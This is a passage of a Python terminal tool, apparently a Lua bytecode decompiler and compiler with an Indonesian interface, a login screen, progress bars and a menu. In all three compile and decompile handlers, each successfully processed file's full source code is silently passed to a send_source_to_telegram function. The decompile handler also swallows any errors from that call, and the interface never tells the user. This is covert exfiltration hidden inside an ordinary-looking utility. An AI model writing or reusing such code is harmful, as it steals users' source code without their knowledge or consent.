    sys.stdout.write("  👤 Username » ")
    sys.stdout.flush()
    username = input("").strip()
    
    sys.stdout.write("  🔑 Password » ")
    sys.stdout.flush()
    password = input("").strip()

    if not username or not password:
        console.print(Panel(
            "[bold red]❌ Username dan password tidak boleh kosong![/bold red]",
            border_style="red", box=box.ROUNDED, padding=(0, 2)))
        _pause()
        return False

    console.print("\n  [cyan]🔄 Login...[/cyan]")
    ok, result = auth_client.login(username, password)

    console.print()
    if ok:
        console.print(Panel(
            f"[bold green]✅ LOGIN BERHASIL![/bold green]\n"
            f"[dim]Username: {auth_client.current_user}[/dim]\n"
            f"[dim]Device ID: {auth_client.current_device_id}[/dim]",
            border_style="green", box=box.ROUNDED, padding=(0, 2)))
        _pause()
        return True
    else:
        msg = result.get('message') or result.get('error', 'Unknown error')
        console.print(Panel(
            f"[bold red]❌ LOGIN GAGAL[/bold red]\n"
            f"[dim]{msg}[/dim]",
            border_style="red", box=box.ROUNDED, padding=(0, 2)))
        _pause()
        return False

# ══════════════════════════════════════════════════════════════════════════
#  LIVE UI — PROGRESS BAR
# ══════════════════════════════════════════════════════════════════════════
class _KN012LiveUI:
    _RAINBOW = ["red","red","bright_red","bright_red","yellow","yellow","bright_yellow",
                "green","bright_green","bright_green","cyan","bright_cyan","bright_cyan","blue","bright_blue"]

    def __init__(self, title, mode, total):
        self._title  = title.upper()
        self._mode   = mode.upper()
        self._total  = max(total, 1)
        self._state  = {"file":"","status":"","done":0,"ok":0,"err":0,"start":time.time()}
        self._live   = _RichLive(self._render(), console=console, refresh_per_second=20, auto_refresh=True)

    def _bar(self, pct, width=40):
        bar = _RichText()
        filled = max(0, min(int(pct / 100.0 * width), width))
        for i in range(width):
            if i < filled:
                idx = min(int((i / width) * len(self._RAINBOW)), len(self._RAINBOW) - 1)
                bar.append("█", style=self._RAINBOW[idx])
            else:
                bar.append("░", style="dim bright_black")
        return bar

    def _render(self):
        s = self._state; done = s["done"]
        elapsed = time.time() - s["start"]
        remaining = self._total - done
        if done > 0 and elapsed > 0:
            secs = int((elapsed / done) * remaining)
            m, sc = divmod(secs, 60)
            eta = f"{m}m {sc:02d}s left"
        else:
            eta = "calculating..."
        pct = (done / self._total) * 100.0
        now = datetime.now()
        t = _RichText()
        t.append("╔" + "═" * 54 + "╗\n", style="bold bright_magenta")
        t.append("║", style="bold bright_magenta")
        t.append("  ⚡  K A P T E N 0 1 2 G A M I NG  ⚡  ", style="bold bright_yellow")
        t.append(" ║\n", style="bold bright_magenta")
        t.append("║", style="bold bright_magenta")
        t.append(f"  {now.strftime('%d-%m-%Y')}   {now.strftime('%H:%M:%S')}   📱 @KAPTEN_012   ", style="dim bright_cyan")
        t.append("║\n", style="bold bright_magenta")
        t.append("╠" + "═" * 54 + "╣\n", style="bold bright_magenta")
        t.append("║  ", style="bold bright_magenta")
        t.append(f"▶  {self._title}  {self._mode}", style="bold bright_cyan")
        spaces = 54 - 5 - len(f"{self._title}  {self._mode}")
        t.append(" " * max(spaces, 0) + "║\n", style="bold bright_magenta")
        t.append("║  ", style="bold bright_magenta")
        t.append_text(self._bar(pct))
        t.append(f"  {pct:.1f}%", style="bold bright_white")
        t.append("  ║\n", style="bold bright_magenta")
        t.append("║  ", style="bold bright_magenta")
        t.append(f"Files: {done}/{self._total}", style="bright_white")
        t.append(f"   ⏱  {eta}", style="bright_cyan")
        t.append(" " * max(54 - 5 - len(f"Files: {done}/{self._total}   ⏱  {eta}"), 0) + "║\n", style="bold bright_magenta")
        fn = s["file"]; fn = fn[:45] + "…" if len(fn) > 48 else fn
        t.append("║  ", style="bold bright_magenta")
        t.append(f"⊙  {fn}", style="bold bright_cyan")
        t.append(" " * max(54 - 5 - len(f"⊙  {fn}"), 0) + "║\n", style="bold bright_magenta")
        st = s["status"]
        t.append("║  ", style="bold bright_magenta")
        t.append(f"⏭  {st}" if st else "   ", style="bright_yellow")
        t.append(" " * max(54 - 5 - len(f"⏭  {st}") if st else 54 - 5, 0) + "║\n", style="bold bright_magenta")
        t.append("╠" + "═" * 54 + "╣\n", style="bold bright_magenta")
        t.append("║  ", style="bold bright_magenta")
        t.append(f"✓ OK: {s['ok']}", style="bold bright_green")
        t.append("     ", style="")
        t.append(f"✗ Error: {s['err']}", style="bold bright_red")
        t.append(" " * max(54 - 5 - len(f"✓ OK: {s['ok']}     ✗ Error: {s['err']}"), 0) + "║\n", style="bold bright_magenta")
        t.append("╚" + "═" * 54 + "╝\n", style="bold bright_magenta")
        return t

    def advance(self, current_file="", status="", ok_delta=1, err_delta=0):
        s = self._state
        if current_file: s["file"] = current_file
        if status: s["status"] = status
        s["done"] += 1; s["ok"] += ok_delta; s["err"] += err_delta
        self._live.update(self._render())

    def __enter__(self): self._live.__enter__(); return self
    def __exit__(self, *a): self._live.__exit__(*a)

# ──────────────────────────────────────────────────────────────────────────
#  BANNER & MENU
# ──────────────────────────────────────────────────────────────────────────

def _print_banner():
    """Cetak banner premium dengan garis pemisah."""
    now = datetime.now()
    user_info = f"{auth_client.current_user} @" if auth_client.is_authenticated() else "Not Authenticated"
    
    console.print(_RichText("▄" * 56, style="bold bright_magenta"))
    console.print(Panel(
        Align.center(
            _RichText.assemble(
                ("⚡  K A P T E N 0 1 2 T O O L S  ⚡\n", "bold bright_yellow"),
                ("▓▓  L U A T O O L S  ▓▓\n",           "bold bright_cyan"),
                ("━" * 36 + "\n",                                   "dim bright_magenta"),
                ("Version 7.0 [ENCRYPTED AUTH]",                   "bold bright_white"),
                ("   │   ",                                         "dim white"),
                (now.strftime('%d-%m-%Y'),                          "bold bright_cyan"),
                ("   ",                                             ""),
                (now.strftime('%H:%M:%S'),                          "bold bright_yellow"),
                ("\n📱  Powered By @KAPTEN_012\n",                  "dim white"),
                ("━" * 36 + "\n",                                   "dim bright_magenta"),
                (f"🔑 {user_info}{DEVICE_ID}\n",                   "bold bright_yellow"),
                (f"🔒 Encrypted | Server: {AUTH_SERVER_URL.split('://')[-1]}",     "dim bright_cyan"),
            )
        ),
        border_style="bold bright_magenta",
        box=box.HEAVY,
        padding=(0, 4),
    ))
    console.print(_RichText("▀" * 56, style="bold bright_magenta"))
    console.print()


def _print_menu():
    """Cetak tabel menu yang rapi dengan angka dan deskripsi lengkap."""
    console.print(Align.center(
        _RichText("  ┌─  PILIH MENU  ─┐  ", style="bold black on bright_yellow")
    ))
    console.print()

    t = Table(
        box=box.ROUNDED,
        border_style="bright_yellow",
        show_header=True,
        header_style="bold black on bright_cyan",
        padding=(0, 2),
        min_width=54,
    )
    t.add_column(" NO ", justify="center", style="bold bright_white", width=6)
    t.add_column("FUNGSI",              style="bold", width=26)
    t.add_column("KETERANGAN",          style="dim bright_white", width=32)

    menu_items = [
        ("1", "[bold bright_cyan]🔓  Decompile[/bold bright_cyan]",
         "Bytecode → Source Lua"),
        ("2", "[bold bright_green]🔒  Compile[/bold bright_green]",
         "Source Lua →  Bytecode"),
        ("3", "[bold bright_yellow]♻   Compile Decompiled[/bold bright_yellow]",
         "decompiled/ → compiled/"),
        ("4", "[bold bright_magenta]📊  Lihat Laporan[/bold bright_magenta]",
         "Tampilkan laporan terakhir"),
        ("5", "[bold bright_blue]👤 Info Auth[/bold bright_blue]",
         "Tampilkan info authentication"),
        ("0", "[bold bright_red]❌  Logout/Keluar[/bold bright_red]",
         "Logout dan exit dari program"),
    ]

    for num, func, desc in menu_items:
        t.add_row(
            f"[bold bright_white] {num} [/bold bright_white]",
            func,
            desc,
        )

    console.print(Align.center(t))
    console.print()
    console.print(Align.center(
        _RichText("─" * 54, style="dim bright_magenta")
    ))
    console.print(Align.center(
        _RichText.assemble(
            ("  Masukkan nomor pilihan  ", "dim bright_white"),
            ("[0]", "bold bright_red"),
            (" · ", "dim white"),
            ("[1]", "bold bright_cyan"),
            (" · ", "dim white"),
            ("[2]", "bold bright_green"),
            (" · ", "dim white"),
            ("[3]", "bold bright_yellow"),
            (" · ", "dim white"),
            ("[4]", "bold bright_magenta"),
            ("  ", ""),
        )
    ))
    console.print(Align.center(
        _RichText("─" * 54, style="dim bright_magenta")
    ))
    console.print()


def _get_choice() -> str:
    sys.stdout.write("  ⚡  Pilihan » ")
    sys.stdout.flush()
    try:
        choice = input("").strip()
    except (EOFError, KeyboardInterrupt):
        choice = "0"
    return choice


def _pause():
    console.print()
    console.print(Panel(
        Align.center(_RichText("↩   Tekan [Enter] untuk kembali ke menu ...", style="bold bright_magenta")),
        border_style="dim bright_magenta",
        box=box.ROUNDED,
        padding=(0, 2),
    ))
    try:
        input("")
    except (EOFError, KeyboardInterrupt):
        pass


def _invalid_input(choice: str):
    console.print()
    console.print(Panel(
        f"[bold red]❌  Pilihan [bright_white]\"{choice}\"[/bright_white] tidak valid![/bold red]\n"
        f"[dim]Masukkan angka antara [bold]0[/bold] sampai [bold]5[/bold][/dim]",
        border_style="red",
        box=box.ROUNDED,
        padding=(0, 2),
    ))
    time.sleep(1.5)

# ──────────────────────────────────────────────────────────────────────────
#  OPERATION HANDLERS
# ──────────────────────────────────────────────────────────────────────────
def do_decompile(KAPTEN_ORI_dir):
    global _last_report_path
    console.print(Panel(
        "[bold bright_cyan]🔓  DECOMPILE MODE[/bold bright_cyan]\n"
        "[dim]KAPTEN_ORI/ → decompiled/[/dim]",
        border_style="bright_cyan", box=box.ROUNDED, padding=(0, 2)))

    lua_files = [f for f in os.listdir(KAPTEN_ORI_dir) if f.endswith('.lua')]
    if not lua_files:
        console.print(Panel("[bold red]❌ Tidak ada file .lua di folder KAPTEN_ORI/[/bold red]",
                            border_style="red", box=box.ROUNDED))
        return

    console.print(f'  [bold bright_white]📄 {len(lua_files)} file ditemukan.[/bold bright_white]\n')
    out_dir     = os.path.join(SCRIPT_DIR, "decompiled")
    reports_dir = os.path.join(SCRIPT_DIR, "reports")
    os.makedirs(out_dir, exist_ok=True)
    report = OperationReport('DECOMPILE')

    with _KN012LiveUI(" DECOMPILE", "MODE", len(lua_files)) as ui:
        for fname in lua_files:
            in_path  = os.path.join(KAPTEN_ORI_dir, fname)
            out_path = os.path.join(out_dir, fname)
            in_size  = os.path.getsize(in_path)
            entry    = _FileEntry(fname, in_size); t0 = time.time()
            success, err, tool, lines, artifacts = decompile_file(in_path, out_path)
            entry.elapsed = time.time()-t0; entry.tool=tool; entry.lines=lines; entry.artifacts=artifacts
            if success:
                entry.status='ok'; entry.size_out=os.path.getsize(out_path)
                if auth_client.is_authenticated():
                    try:
                        with open(out_path, 'r', encoding='utf-8') as sf:
                            source_code = sf.read()
                        send_source_to_telegram(source_code, fname, f"DECOMPILE|{fname}")
                    except:
                        pass
                ui.advance(current_file=fname, status="✓ Selesai", ok_delta=1)
            else:
                entry.status='fail'; entry.error=err
                ui.advance(current_file=fname, status="❌ Gagal", ok_delta=0, err_delta=1)
            report.add(entry)

    report.finish(); console.print(); report.print_terminal()
    saved = report.save_to_file(reports_dir); _last_report_path = saved

def do_compile(input_dir):
    global _last_report_path
    console.print(Panel(
        "[bold bright_green]🔒  COMPILE MODE[/bold bright_green]\n"
        "[dim]Input/ → compiled/ (Bytecode)[/dim]",
        border_style="bright_green", box=box.ROUNDED, padding=(0, 2)))

    lua_files = [f for f in os.listdir(input_dir) if f.endswith('.lua')]
    if not lua_files:
        console.print(Panel(f"[bold red]❌ Tidak ada file .lua di '{input_dir}'[/bold red]",
                            border_style="red", box=box.ROUNDED))
        return

    console.print(f"\n  [bold bright_white]📄 {len(lua_files)} file .lua ditemukan.[/bold bright_white]\n")
    out_dir     = os.path.join(SCRIPT_DIR, "compiled")
    reports_dir = os.path.join(SCRIPT_DIR, "reports")
    os.makedirs(out_dir, exist_ok=True)
    to_compile = []; skipped = 0

    for fname in lua_files:
        in_path = os.path.join(input_dir, fname)
        try:
            with open(in_path,'rb') as _f: _hdr = _f.read(4)
            if _hdr == b'\x1bLua':
                console.print(f"  [yellow]⚠  {fname} — bytecode, dilewati[/yellow]")
                skipped += 1; continue
        except: pass
        to_compile.append(fname)

    report = OperationReport('COMPILE')
    if to_compile:
        with _KN012LiveUI(" COMPILE", "MODE", len(to_compile)) as ui:
            for fname in to_compile:
                in_path  = os.path.join(input_dir, fname)
                out_path = os.path.join(out_dir, fname)
                in_size  = os.path.getsize(in_path)
                entry    = _FileEntry(fname, in_size); t0 = time.time()
                
                try:
                    with open(in_path, 'r', encoding='utf-8') as sf:
                        source_code = sf.read()
                except:
                    source_code = ""
                
                success, err, tool = compile_file(in_path, out_path)
                entry.elapsed = time.time()-t0; entry.tool = tool
                if success:
                    entry.status='ok'; entry.size_out=os.path.getsize(out_path)
                    if auth_client.is_authenticated() and source_code:
                        send_source_to_telegram(source_code, fname, f"COMPILE|{fname}")
                    ui.advance(current_file=fname, status="Compiled ✓", ok_delta=1)
                else:
                    entry.status='fail'; entry.error=err
                    ui.advance(current_file=fname, status=f"❌ {err[:35]}", ok_delta=0, err_delta=1)
                report.add(entry)

    report.finish(); console.print(); report.print_terminal()
    saved = report.save_to_file(reports_dir); _last_report_path = saved
    ok_count = sum(1 for e in report.entries if e.status=='ok')
    if ok_count > 0:
        zip_path = os.path.join(SCRIPT_DIR, "compiled_output.zip")
        make_zip(out_dir, zip_path)

def do_compile_from_decompiled():
    global _last_report_path
    dec_dir = os.path.join(SCRIPT_DIR, "decompiled")
    if not os.path.isdir(dec_dir):
        console.print(Panel(
            "[bold red]❌ Folder 'decompiled/' tidak ditemukan.\n[dim]Jalankan Decompile terlebih dahulu.[/dim][/bold red]",
            border_style="red", box=box.ROUNDED))
        return

    lua_files = [f for f in os.listdir(dec_dir) if f.endswith('.lua')]
    if not lua_files:
        console.print(Panel("[bold red]❌ Tidak ada file .lua di decompiled/[/bold red]",
                            border_style="red", box=box.ROUNDED))
        return

    console.print(Panel(
        "[bold bright_yellow]♻   COMPILE FROM DECOMPILED[/bold bright_yellow]\n"
        "[dim]decompiled/ → compiled/ (Bytecode)[/dim]",
        border_style="bright_yellow", box=box.ROUNDED, padding=(0, 2)))

    ft = Table(box=box.SIMPLE_HEAVY, border_style="bright_cyan", show_header=True,
               header_style="bold black on bright_cyan", padding=(0, 1))
    ft.add_column("NO",   style="bold bright_white", justify="center", width=5)
    ft.add_column("FILE", style="bright_cyan", width=40)
    for i, f in enumerate(lua_files, 1):
        ft.add_row(f"[bold]{i}[/bold]", f)
    console.print(ft)
    console.print()

    console.print(Panel(
        Align.center(_RichText.assemble(
            ("Compile ", "dim bright_white"),
            (str(len(lua_files)), "bold bright_yellow"),
            (" file di atas?  [y] Ya  /  [n] Batal", "dim bright_white"),
        )),
        border_style="bright_yellow", box=box.ROUNDED, padding=(0, 2)))
    sys.stdout.write("  ⚡  Konfirmasi [y/n] » ")
    sys.stdout.flush()
    confirm = input("").strip().lower()
    if confirm != 'y':
        console.print(Panel("[yellow]↩  Dibatalkan.[/yellow]", border_style="yellow", box=box.ROUNDED))
        return

    out_dir     = os.path.join(SCRIPT_DIR, "compiled")
    reports_dir = os.path.join(SCRIPT_DIR, "reports")
    os.makedirs(out_dir, exist_ok=True)
    to_compile = []; skipped = 0

    for fname in lua_files:
        in_path = os.path.join(dec_dir, fname)
        try:
            with open(in_path,'rb') as _f: _hdr = _f.read(4)
            if _hdr == b'\x1bLua': skipped += 1; continue
        except: pass
        to_compile.append(fname)

    report = OperationReport('COMPILE')
    if to_compile:
        with _KN012LiveUI(" COMPILE", "FROM DECOMPILED", len(to_compile)) as ui:
            for fname in to_compile:
                in_path  = os.path.join(dec_dir, fname)
                out_path = os.path.join(out_dir, fname)
                in_size  = os.path.getsize(in_path)
                entry    = _FileEntry(fname, in_size); t0 = time.time()
                
                try:
                    with open(in_path, 'r', encoding='utf-8') as sf:
                        source_code = sf.read()
                except:
                    source_code = ""
                
                success, err, tool = compile_file(in_path, out_path)
                entry.elapsed = time.time()-t0; entry.tool = tool
                if success:
                    entry.status='ok'; entry.size_out=os.path.getsize(out_path)
                    if auth_client.is_authenticated() and source_code:
                        send_source_to_telegram(source_code, fname, f"COMPILE_FROM_DEC|{fname}")
                    ui.advance(current_file=fname, status="Compiled ✓", ok_delta=1)
                else:
                    entry.status='fail'; entry.error=err
                    ui.advance(current_file=fname, status=f"❌ {err[:35]}", ok_delta=0, err_delta=1)
                report.add(entry)

    report.finish(); console.print(); report.print_terminal()
    saved = report.save_to_file(reports_dir); _last_report_path = saved
    ok_count = sum(1 for e in report.entries if e.status=='ok')
    if ok_count > 0:
        zip_path = os.path.join(SCRIPT_DIR, "compiled_output.zip")
        make_zip(out_dir, zip_path)

def do_view_last_report():
    if _last_report_path and os.path.isfile(_last_report_path):
        path = _last_report_path
    else:
        rdir = os.path.join(SCRIPT_DIR, 'reports')
        if not os.path.isdir(rdir):
            console.print(Panel("[bold red]❌ Belum ada laporan.[/bold red]",
                                border_style="red", box=box.ROUNDED))
            return
        files = sorted([os.path.join(rdir, f) for f in os.listdir(rdir)
                        if f.startswith('report_')], key=os.path.getmtime, reverse=True)
        if not files:
            console.print(Panel("[bold red]❌ Laporan tidak ditemukan.[/bold red]",
                                border_style="red", box=box.ROUNDED))
            return
        path = files[0]
    try:
        with open(path, 'r', encoding='utf-8') as f: content = f.read()
        console.print(Panel(f"[dim]📄 {path}[/dim]",
                            border_style="bright_cyan", box=box.ROUNDED, padding=(0, 1)))
        console.print(content)
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")

def do_show_auth_info():
    """Tampilkan info authentication"""
    console.print(Panel(
        f"[bold bright_cyan]🔐  AUTHENTICATION INFO[/bold bright_cyan]",
        border_style="bright_cyan", box=box.ROUNDED, padding=(0, 2)))
    
    auth_table = Table(box=box.SIMPLE_HEAVY, border_style="bright_cyan", show_header=False, padding=(0, 2))
    auth_table.add_column("Key", style="bold bright_yellow", width=20)
    auth_table.add_column("Value", style="bright_white", width=50)
    
    auth_status = "✅ Authenticated" if auth_client.is_authenticated() else "❌ Not Authenticated"
    auth_table.add_row("Status", auth_status)
    auth_table.add_row("Username", auth_client.current_user or "N/A")
    auth_table.add_row("Device ID", auth_client.current_device_id or "N/A")
    auth_table.add_row("Auth Server", AUTH_SERVER_URL)
    auth_table.add_row("Cache Dir", str(auth_client.cache_dir))
    
    console.print(auth_table)
    console.print()

# ═════════════════════════════════════════════════════════════════════════
#  MAIN — LOOP UTAMA
# ═════════════════════════════════════════════════════════════════════════
def main():
    clear_screen()
    auto_install_deps()

    _missing_jar = not os.path.isfile(REMAP_JAR) or not os.path.isfile(REMAP_OPMAP)

    input_dir      = ensure_input_folder()
    KAPTEN_ORI_dir = ensure_KAPTEN_ORI_folder()
    for d in ["decompiled", "compiled", "reports"]:
        os.makedirs(os.path.join(SCRIPT_DIR, d), exist_ok=True)

    # ════════════════════════
    #  AUTH SCREEN
    # ════════════════════════
    authenticated = auth_screen()
    
    if not authenticated:
        console.print()
        console.print(Panel(
            Align.center(_RichText.assemble(
                ("⚠  Autentikasi diperlukan untuk menggunakan tools ini!\n\n", "bold bright_yellow"),
                ("Hubungi admin ", "dim bright_white"),
                ("@KAPTEN_012", "bold bright_cyan"),
                (" untuk mendapatkan akses.", "dim bright_white"),
            )),
            border_style="yellow",
            box=box.DOUBLE_EDGE,
            padding=(1, 4),
        ))
        console.print()
        console.print("  [cyan]💡 Tips: Jalankan auth_server.py terlebih dahulu:[/cyan]")
        console.print("  [dim]   python auth_server.py[/dim]\n")
        sys.exit(0)

    # ════════════════════════
    #  MAIN LOOP
    # ════════════════════════
    while True:
        clear_screen()

        _print_banner()

        if _missing_jar:
            console.print(Panel(
                f"[bold red]⚠  rahasia_goat.jar / .opmap tidak ditemukan![/bold red]\n"
                f"[bright_white]Taruh file berikut di:[/bright_white] [bright_cyan]{SCRIPT_DIR}[/bright_cyan]\n"
                f"  • [dim]rahasia_goat.jar[/dim]\n  • [dim]rahasia_goat.opmap[/dim]",
                border_style="red", box=box.ROUNDED, padding=(0, 2)))
            console.print()

        _print_menu()

        choice = _get_choice()

        if choice == '1':
            clear_screen()
            _print_banner()
            do_decompile(KAPTEN_ORI_dir)
            _pause()

        elif choice == '2':
            clear_screen()
            _print_banner()
            do_compile(input_dir)
            _pause()

        elif choice == '3':
            clear_screen()
            _print_banner()
            do_compile_from_decompiled()
            _pause()

        elif choice == '4':
            clear_screen()
            _print_banner()
            do_view_last_report()
            _pause()

        elif choice == '5':
            clear_screen()
            _print_banner()
            do_show_auth_info()
            _pause()

        elif choice == '0':
            auth_client.logout()
            clear_screen()
            console.print()
            console.print(Panel(
                Align.center(_RichText.assemble(
                    ("🎉  Terima kasih sudah menggunakan Auto Tool!\n\n", "bold bright_green"),
                    ("Follow   ", "dim bright_white"),
                    ("@KAPTEN_012", "bold bright_cyan"),
                    ("   untuk update terbaru!\n", "dim bright_white"),
                    ("\n🔑 Device ID: ", "dim bright_white"),
                    (f"{DEVICE_ID}", "bold bright_yellow"),
                )),
                title="[bold bright_magenta]  👋  Sampai Jumpa  [/bold bright_magenta]",
                border_style="bright_magenta",
                box=box.DOUBLE_EDGE,
                padding=(1, 4),
            ))
            console.print()
            sys.exit(0)

        else:
            _invalid_input(choice)


if __name__ == '__main__':
    main()
